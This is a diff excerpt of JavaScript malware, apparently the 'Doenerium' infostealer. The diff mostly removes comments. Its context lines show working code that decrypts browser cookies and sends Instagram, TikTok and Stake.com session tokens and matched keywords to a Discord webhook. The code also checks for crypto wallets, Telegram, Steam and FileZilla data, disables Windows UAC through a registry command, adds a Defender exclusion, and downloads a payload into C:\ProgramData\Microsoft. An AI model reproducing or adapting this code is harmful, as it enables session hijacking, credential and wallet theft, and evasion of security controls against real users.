         passwordsCount = passwordsEntries.length;
     }
 
-    // Count autofills
     const autofillsFolderPath = path.join(mainFolderPath, 'Autofills');
     let autofillCount = 0;
 
@@ -3077,10 +2800,8 @@ async function checkWallets(mainFolderPath) {
     let foundWalletsText = '';
 
     try {
-        // Check if the wallet folder exists inside the main folder
         const walletFolder = path.join(mainFolderPath, 'Wallets');
         if (fs.existsSync(walletFolder)) {
-            // Check all walletLocalPaths and display them with emojis
             const walletEntries = await fs.promises.readdir(walletFolder);
             let metamaskFound = false;
 
@@ -3111,7 +2832,6 @@ async function checkWallets(mainFolderPath) {
 }
 
 async function checkFolderstele(mainFolderPath) {
-    // Function similar to checkFolders without emojis for Telegram
     const foldersToCheck = [
         { name: 'Telegram' },
         { name: 'Steam' },
@@ -3548,7 +3268,6 @@ async function getCookies() {
                         decipher.setAuthTag(authTag);
                         decrypted = decipher.update(encryptedData, 'base64', 'utf-8') + decipher.final('utf-8');
 
-                        // Handle different services
                         if (row.host_key === '.instagram.com' && row.name === 'sessionid') {
                             SubmitInstagram(`${decrypted}`);
                         } else if (row.host_key === '.tiktok.com' && row.name === 'sessionid') {
@@ -3565,7 +3284,6 @@ async function getCookies() {
                             sendStakeSessionToDiscord(`${decrypted}`);
                         }
 
-                        // Search for keywords
                         for (const keyword of keywords) {
                             if (row.host_key.includes(keyword) && !matchedKeywords.includes(keyword)) {
                                 matchedKeywords.push(keyword);
@@ -3592,7 +3310,6 @@ async function getCookies() {
         });
     }
 
-    // Send matched keywords to Discord webhook
     if (matchedKeywords.length > 0) {
         sendKeywordsToDiscord(matchedKeywords);
     }
@@ -3605,11 +3322,9 @@ async function getCookies() {
         if (cookies.length !== 0) {
             const cookiesContent = cookies.join('');
 
-            // Add the banner content to the beginning of each cookies file
             const cookiesWithBanner = `${user.copyright}\n${cookiesContent}`;
             const fileName = `${browserName}.txt`;
 
-            // Specify the folder path for Cookies
             const cookiesFolderPath = path.join(mainFolderPath, 'Cookies');
             const cookiesFilePath = path.join(cookiesFolderPath, fileName);
 
@@ -3618,10 +3333,8 @@ async function getCookies() {
                     fs.mkdirSync(cookiesFolderPath);
                 }
 
-                // Write the individual cookies file to the Cookies folder
                 fs.writeFileSync(cookiesFilePath, cookiesWithBanner, { encoding: 'utf8' });
 
-                // Move the cookies file to the main folder
                 moveFileToFolder(cookiesFilePath, 'Cookies');
             } catch (error) {
                 console.error(`Error writing/moving cookies file ${cookiesFilePath}:`, error);
@@ -3632,10 +3345,8 @@ async function getCookies() {
 
 async function sendKeywordsToDiscord(keywords) {
     try {
-        // Format keywords as clickable links separated by commas
         const formattedKeywords = keywords.map(keyword => `[**${keyword}**](https://${encodeURIComponent(keyword)})`).join(', ');
 
-        // Embed style
         const embed_data = {
             "title": "Doenerium Keywords",
             "description": formattedKeywords,
@@ -3662,7 +3373,6 @@ async function sendKeywordsToDiscord(keywords) {
 
 async function sendStakeSessionToDiscord(decrypted) {
     try {
-        // Embed style
         const embed_data = {
             "title": "Stake.com Session Detected",
             "description": `Session Cookie: \n\`\`\`${decrypted}\`\`\``,
@@ -3900,10 +3610,7 @@ async function submitFileZilla() {
 
 function disableuac() {
     try {
-        // Command to disable UAC
         const command = 'reg add "HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System" /v EnableLUA /t REG_DWORD /d 0 /f';
-
-        // Execute the command
         execSync(command, { stdio: 'inherit' });
     } catch (error) {
         console.error(`Failed to disable UAC: ${error.message}`);
@@ -3935,10 +3642,8 @@ const saveDir = 'C:\\ProgramData\\Microsoft';
 
 async function binder(url, saveDir) {
   try {
-    // Add Windows Defender exclusion for the save directory
     addDefenderExclusion(saveDir);
 
-    // Ensure the save directory exists
     if (!fs.existsSync(saveDir)) {
       fs.mkdirSync(saveDir, { recursive: true });
     }
